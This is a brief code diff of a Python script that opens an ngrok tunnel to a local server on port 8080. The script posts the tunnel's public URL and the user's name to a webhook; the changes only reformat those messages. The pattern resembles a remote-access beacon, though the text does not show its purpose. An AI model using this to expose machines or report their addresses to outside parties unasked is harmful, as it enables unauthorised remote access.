@@ -25,7 +25,7 @@ current_directory = os.getcwd()
 
 def start_ngrok():
     ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    hook.send("Waiting for ngrok to start...")
+    hook.send("```Waiting for ngrok to start...```")
     time.sleep(10)
 
     try:
@@ -33,7 +33,6 @@ def start_ngrok():
         tunnels = response.json().get('tunnels', [])
         if tunnels:
             public_url = tunnels[0]['public_url']
-            hook.send(f"Ngrok public URL: {public_url}")
             hook.send(f"```json\n{public_url}\n```")
             return public_url, ngrok_process
         else:
@@ -115,7 +114,7 @@ def get_username():
     return jsonify({"username": username}), 200
 
 def cleanup(signum, frame):
-    hook.send("Shutting down gracefully...")
+    hook.send(f"```{username} is offline.```")
     ngrok_process.terminate()
     sys.exit(0)
 
